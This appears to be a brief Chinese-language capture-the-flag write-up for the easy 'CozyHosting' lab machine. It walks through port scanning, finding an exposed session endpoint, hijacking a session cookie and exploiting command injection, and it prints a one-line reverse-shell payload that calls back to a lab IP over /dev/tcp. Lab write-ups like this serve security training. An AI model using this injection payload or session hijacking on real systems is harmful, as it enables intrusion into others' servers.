![圖片](https://github.com/favorite986141/jamescao/assets/125249893/ca53d48d-8c3e-4d90-9c0b-5992be7d2797)CozyHosting Level:Easy
===
尋找user.txt
---
1.Nmap掃描IP，發現有開22、80

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/be94bec4-7737-4fb2-8017-4f20fccf7517)

2.使用dirsearch搜尋目錄，找到/actuator/sessions，內容跟session有關

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/969ec080-c913-4f63-b819-1aa035fd5303)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/a068678f-5ba5-48ce-8923-3fc98f91c180)

3.透過session cookie登入Web

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/df05fe7b-4e80-4c59-b946-eb1746901947)

4.找到疑似可執行ssh，透過burpsuite抓包測試確認可以執行指令

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/f05c4cc3-a6d0-4d1f-bfd4-33d3ab5bcc4e)

5.插入reverse shell取得shell

     ;`(sh)0>/dev/tcp/10.10.14.62/1234`    
 
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/eb0de815-97af-4104-bfd9-5ccb5aea6225)
